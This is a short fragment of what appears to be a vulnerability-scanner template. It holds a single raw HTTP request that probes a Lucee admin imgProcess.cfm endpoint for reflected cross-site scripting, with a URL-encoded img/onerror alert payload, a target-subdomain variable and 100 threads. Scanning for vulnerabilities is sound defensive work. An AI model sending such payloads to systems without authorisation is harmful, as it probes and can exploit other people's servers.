  - 'GET /lucees3ezf%3cimg%20src%3da%20onerror%3dalert(''{{randstr}}'')%3elujb7/admin/imgProcess.cfm
    HTTP/1.1

    Host: {{Subdomains}}

    '
  threads: 100
